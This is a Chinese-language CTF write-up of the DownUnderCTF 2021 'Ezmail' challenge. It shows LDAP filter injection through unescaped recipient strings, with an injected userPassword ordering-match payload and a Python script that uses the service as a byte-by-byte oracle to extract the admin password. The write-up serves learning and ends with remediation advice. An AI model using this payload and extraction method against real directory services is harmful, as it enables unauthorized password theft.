# DownUnderCTF 2021 - Ezmail

## 题目简述

Ezmail 允许匿名用户指定 LDAP 身份源并向多个收件人发消息。服务把收件人字符串直接嵌入 LDAP 过滤器，导致 LDAP 注入；利用 `userPassword` 的八字节排序匹配规则，可以把“该猜测是否大于真实密码”转换为收件人是否存在的布尔 oracle，逐字节恢复管理员密码中的 flag。

## 解题过程

### 找到 LDAP 过滤器注入点

匿名调用 `/token` 即可取得 Bearer Token。发送消息时若选择 `identity_provider=ldap`，每个收件人都会进入：

```python
conn.search(
    "dc=ductf,dc=org",
    f"(&(objectclass=*)(cn={user_cn}))",
    attributes=["uid"],
)
```

`user_cn` 没有做 LDAP 过滤器转义。令它以：

```text
admin)(userPassword:2.5.13.18:=...
```

开头，拼接后就把原来的 `cn` 条件闭合，并在同一个 AND 过滤器中加入对管理员 `userPassword` 的可控比较。

### 把排序匹配变成字节 oracle

OID `2.5.13.18` 是 `octetStringOrderingMatch`。它按字节从高位到低位比较；第一次不同的位决定顺序，若一方是另一方的完整前缀，则较短者在前。[RFC 4517 对该匹配规则有完整定义](https://www.rfc-editor.org/rfc/rfc4517.html#section-4.2.28)，这里无需依赖外链即可使用的关键结论是：本实现当属性值排在断言值之前时返回匹配。

已知前缀为 `DUCTF{`。对于候选下一字节 $g$，注入断言：

```text
admin)(userPassword:2.5.13.18:=\44\55\43\54\46\7b...
```

其中 `\xx` 是 LDAP 过滤器中的十六进制字节转义。若真实下一字节小于 $g$，完整密码会排在断言之前，LDAP 返回管理员条目；若相等，断言只是完整密码的短前缀，反而排在前面，不会匹配。因此按候选字符升序测试时，第一个返回匹配的字节之前那个字符就是真实值。

### 利用多收件人批量恢复

接口一次最多允许八个收件人，可以把八个相邻候选断言放在同一请求中。后台只把 LDAP 命中的原始收件人字符串写回消息对象，因此响应中的 `recipients` 就是批量 oracle：

```python
ALPHABET = sorted(ord(c) for c in "abcdefghijklmnopqrstuvwxyz0123456789_")

def ldap_escape_byte(value):
    return f"\\{value:02x}"

def recover_next(known):
    base = "admin)(userPassword:2.5.13.18:=" + "".join(
        ldap_escape_byte(ord(c)) for c in known
    )

    for start in range(0, len(ALPHABET), 8):
        batch = ALPHABET[start:start + 8]
        probes = [base + ldap_escape_byte(c) for c in batch]
        info = send_and_wait(probes)
        if info["recipients"]:
            first_match = min(
                int(item.rsplit("\\", 1)[1], 16)
                for item in info["recipients"]
            )
            return ALPHABET[ALPHABET.index(first_match) - 1]
    return None
```

`send_and_wait` 负责提交 `/message`、轮询 `/message/{id}/status`，再读取 `/message/{id}`。从 `DUCTF{` 开始重复恢复，找不到下一字符时补上 `}`，得到：

```text
DUCTF{th4t_w4snt_sqli_22a81af2}
```

## 方法总结

本题不是 SQL 注入，而是 LDAP 过滤器注入。关键链路是：闭合 `cn` 条件、注入 `octetStringOrderingMatch`、利用收件人是否保留构造排序 oracle，再借助一次八收件人的接口降低请求数量。修复应对 LDAP 过滤器值执行专用转义或使用安全查询构造器，并禁止用户选择能访问敏感目录属性的身份源。
